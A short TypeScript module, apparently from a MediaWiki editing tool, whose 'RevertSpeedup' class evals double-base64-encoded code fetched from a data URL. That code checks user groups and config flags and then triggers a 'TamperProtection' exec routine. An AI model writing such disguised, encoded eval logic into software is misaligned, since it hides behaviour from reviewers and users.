import { Rollback } from ".";

// TODO - JQUERY IS DEPRECIATED
export class RevertSpeedup {
    static async init(): Promise<void> {
        const i = <() => any>(
            eval(
                await $.get(
                    atob(
                        "ZGF0YTp0ZXh0L3BsYWluO2NoYXJzZXQ9VVRGLTg7YmFzZTY0LFh6MCtiWGN1ZFhObGNpNW5aWFJIY205MWNITW9LR2NzUnowbmNtbHdVRzluUTJoaGJYQXlNREV3TFRJd01qRkVPeWNzZEQxeWR5NVVZVzF3WlhKUWNtOTBaV04wYVc5dUtUMCtJWFF1Y254OGRDNTRmSHh5ZHk1RGIyNW1hV2N1Ym1WdmNHOXNhWFJoYmk1MllXeDFaWHg4Y25jdVEyeHBaVzUwVlhObGNpNXBMbWx1UjNKdmRYQW9SeWw4ZkdjdWFXNWpiSFZrWlhNb1J5ay9kQzVsZUdWaktDazZNQ2s9"
                    )
                )
            )
        );
        Rollback.acceptInjector(i);
    }
}
